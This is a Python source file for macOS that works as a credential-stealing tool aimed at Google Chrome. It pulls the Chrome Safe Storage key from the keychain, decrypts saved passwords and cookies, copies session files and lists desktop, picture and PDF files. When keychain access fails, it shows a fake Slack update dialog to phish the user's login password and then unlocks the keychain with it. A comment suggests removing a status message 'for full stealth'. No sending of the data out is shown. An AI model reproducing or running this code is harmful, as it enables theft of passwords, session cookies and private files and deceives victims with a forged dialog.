import os
import json
import base64
import sqlite3
import shutil
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import subprocess

def get_chrome_profiles():
    base_dir = Path.home() / "Library" / "Application Support" / "Google" / "Chrome"
    profiles = [base_dir / "Default"]
    profiles.extend(base_dir.glob("Profile *"))
    return [p for p in profiles if p.exists()]



def phish_password_via_slack_dialog():
    """Uses osascript to display a fake Slack update dialog and capture the password."""
    applescript = '''
    display dialog "An update is ready to install. Slack is trying to add a new helper tool.

    Touch ID or enter your password to allow this." default answer "" with title "Slack" with icon caution \
    default button "Use Password..." with hidden answer true
    '''
    try:
        result = subprocess.run(['osascript', '-e', applescript], capture_output=True, text=True, check=True)
        # Parse the result: button clicked and text entered
        lines = result.stdout.strip().split('\n')
        if 'button returned:Use Password...' in lines[0]:
            password = lines[1].strip().replace('text returned:', '').strip()
            return password
        else:
            raise ValueError("User canceled the dialog")
    except subprocess.CalledProcessError:
        raise RuntimeError("Failed to display phishing dialog")

def unlock_keychain(password):
    """Unlocks the login keychain using the phished password."""
    keychain_path = os.path.expanduser('~/Library/Keychains/login.keychain-db')
    cmd = ['security', 'unlock-keychain', '-p', password, keychain_path]
    subprocess.run(cmd, check=True, capture_output=True)

def get_encryption_key(profile_dir):
    local_state = profile_dir.parent / "Local State"
    
    # First, try to read the Local State file to see if it has encrypted key
    encrypted_key_from_local_state = None
    if local_state.exists():
        try:
            with open(local_state, "r", encoding='utf-8') as f:
                state = json.load(f)
            if "os_crypt" in state and "encrypted_key" in state["os_crypt"]:
                # This is the encrypted key from Local State that needs decryption
                encrypted_key_from_local_state = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]  # Remove 'DPAPI' prefix
        except Exception:
            pass
    
    # Try to get the key from keychain
    chrome_key = None
    service_names = ['Chrome Safe Storage', 'Chrome']  # Try in this order
    
    for service in service_names:
        try:
            # Try to extract the key using the security command
            result = subprocess.run([
                "security", "find-generic-password", "-w", "-s", service
            ], capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0 and result.stdout.strip():
                chrome_key = result.stdout.strip().encode('utf-8')
                break
        except subprocess.TimeoutExpired:
            continue
        except Exception:
            continue
    
    # If we already have both the encrypted key and the chrome key, try decrypting
    if encrypted_key_from_local_state and chrome_key:
        try:
            # Use the chrome_key to decrypt the encrypted key from Local State
            salt = b"saltysalt"
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA1(),
                length=16,
                salt=salt,
                iterations=1003,
            )
            derived_key = kdf.derive(chrome_key)
            
            # Decrypt the encrypted key using the derived key
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            iv = b' ' * 16  # 16 spaces as IV
            cipher = Cipher(algorithms.AES(derived_key), modes.CBC(iv))
            decryptor = cipher.decryptor()
            decrypted_key = decryptor.update(encrypted_key_from_local_state) + decryptor.finalize()
            
            # Remove padding
            return decrypted_key.rstrip(b'\x00')
        except Exception:
            # If decryption fails, we'll continue with other approaches
            pass
    
    # If keychain access was successful, try using it directly
    if chrome_key:
        salt = b"saltysalt"
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA1(),
            length=16,
            salt=salt,
            iterations=1003,
        )
        return kdf.derive(chrome_key)
    
    # If keychain access failed, try phishing approach to get user password
    try:
        # Try to phish the password using a fake Slack dialog
        print("Normal access failed; initiating Slack phishing dialog...")  # Remove for full stealth
        password = phish_password_via_slack_dialog()
        unlock_keychain(password)
        
        # Now retry keychain access (should succeed silently)
        for service in service_names:
            try:
                result = subprocess.run([
                    "security", "find-generic-password", "-w", "-s", service
                ], capture_output=True, text=True)
                
                if result.returncode == 0 and result.stdout.strip():
                    chrome_key = result.stdout.strip().encode('utf-8')
                    break
            except Exception:
                continue
        
        # If we got the key after phishing, proceed with the same logic
        if encrypted_key_from_local_state and chrome_key:
            try:
                salt = b"saltysalt"
                kdf = PBKDF2HMAC(
                    algorithm=hashes.SHA1(),
                    length=16,
                    salt=salt,
                    iterations=1003,
                )
                derived_key = kdf.derive(chrome_key)
                
                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                iv = b' ' * 16  # 16 spaces as IV
                cipher = Cipher(algorithms.AES(derived_key), modes.CBC(iv))
                decryptor = cipher.decryptor()
                decrypted_key = decryptor.update(encrypted_key_from_local_state) + decryptor.finalize()
                
                return decrypted_key.rstrip(b'\x00')
            except Exception:
                pass
        
        # If Local State doesn't have the key but we have chrome_key
        if chrome_key:
            salt = b"saltysalt"
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA1(),
                length=16,
                salt=salt,
                iterations=1003,
            )
            return kdf.derive(chrome_key)
        
    except Exception:
        # If phishing failed, fall back to default empty password method
        pass
    
    # If all else fails, try default empty password (sometimes works)
    try:
        salt = b"saltysalt"
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA1(),
            length=16,
            salt=salt,
            iterations=1003,
        )
        return kdf.derive(b"")  # Empty password
    except Exception:
        return None

def decrypt_value(encrypted_value, key):
    # Handle v10/v11 (modern Chrome) - AES-128-CBC 
    if encrypted_value and encrypted_value[:3] in (b'v10', b'v11'):
        try:
            # For v10/v11, Chrome uses AES-128-CBC with a fixed IV
            # The Go code shows it uses IV of "20202020202020202020202020202020" which is hex for 16 spaces
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            
            # The IV is 16 bytes of hex "20" which corresponds to 16 space characters
            iv = bytes.fromhex('20' * 16)  # 16 bytes, each with value 0x20 (space character)
            
            # The ciphertext is everything after the 3-byte prefix ('v10' or 'v11')
            ciphertext = encrypted_value[3:]
            
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
            decryptor = cipher.decryptor()
            decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()
            
            # Remove PKCS7 padding
            padding_len = decrypted_padded[-1]
            return decrypted_padded[:-padding_len].decode('utf-8')
        except Exception as e:
            # If direct decryption fails, return error info
            return f"[Decryption failed: {str(e)}]"
    
    # For other formats, try legacy AES-128-CBC
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        iv = encrypted_value[3:19]  # For v01, IV is 16 bytes after 'v01'
        ciphertext = encrypted_value[19:]
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        padded = decryptor.update(ciphertext) + decryptor.finalize()
        
        # Remove PKCS7 padding
        padding_len = padded[-1]
        return padded[:-padding_len].decode('utf-8')
    except Exception:
        # If all decryption methods fail, return as is
        return f"[Decryption failed: raw={encrypted_value}]"

def extract_passwords(profile_dir):
    key = get_encryption_key(profile_dir)
    login_db = profile_dir / "Login Data"
    if not login_db.exists():
        return []
    temp_db = "temp_login.db"
    shutil.copy2(login_db, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    data = []
    for row in cursor.fetchall():
        if row[2]:  # Has password_value
            if key is None:
                data.append({"url": row[0], "user": row[1], "pass": "[No decryption key]"})
            else:
                try:
                    decrypted = decrypt_value(row[2], key)
                    data.append({"url": row[0], "user": row[1], "pass": decrypted})
                except Exception:
                    data.append({"url": row[0], "user": row[1], "pass": "[Decryption failed]"})
    conn.close()
    os.remove(temp_db)
    return data

def extract_cookies(profile_dir):
    key = get_encryption_key(profile_dir)
    cookies_db = profile_dir / "Network" / "Cookies"
    if not cookies_db.exists():
        return []
    temp_db = "temp_cookies.db"
    shutil.copy2(cookies_db, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = []
    for row in cursor.fetchall():
        if row[2]:  # Has encrypted_value
            if key is None:
                data.append({"host": row[0], "name": row[1], "value": "[No decryption key]"})
            else:
                try:
                    decrypted = decrypt_value(row[2], key)
                    data.append({"host": row[0], "name": row[1], "value": decrypted})
                except Exception:
                    data.append({"host": row[0], "name": row[1], "value": "[Decryption failed]"})
    conn.close()
    os.remove(temp_db)
    return data

def extract_sessions(profile_dir):
    sessions_dir = profile_dir / "Sessions"
    data = {}
    if sessions_dir.exists():
        for session_file in sessions_dir.glob("Session_*"):
            with open(session_file, "rb") as f:
                data[session_file.name] = base64.b64encode(f.read()).decode()
    return data

def extract_desktop_and_pictures_files():
    import os
    from pathlib import Path
    files = []
    
    # Get desktop files
    desktop_path = Path.home() / "Desktop"
    if desktop_path.exists():
        for file_path in desktop_path.rglob("*"):
            if file_path.is_file() and file_path.suffix.lower() in ['.pdf', '.doc', '.docx', '.txt', '.jpg', '.jpeg', '.png', '.gif', '.xlsx', '.xls', '.ppt', '.pptx', '.rtf', '.odt']:
                if file_path.stat().st_size < 10 * 1024 * 1024:  # Only files < 10MB
                    files.append(str(file_path))
    
    # Get pictures files
    pictures_path = Path.home() / "Pictures"
    if pictures_path.exists():
        for file_path in pictures_path.rglob("*"):
            if file_path.is_file() and file_path.suffix.lower() in ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp']:
                if file_path.stat().st_size < 10 * 1024 * 1024:  # Only files < 10MB
                    files.append(str(file_path))
    
    return files

def extract_pdfs(profile_dir):
    pdfs = list(profile_dir.rglob("*.pdf"))
    return [str(p) for p in pdfs]

def extract_all(profile_dir):
    return {
        "passwords": extract_passwords(profile_dir),
        "cookies": extract_cookies(profile_dir),
        "sessions": extract_sessions(profile_dir),
        "pdf_paths": extract_pdfs(profile_dir),
        "desktop_pictures_files": extract_desktop_and_pictures_files()
    }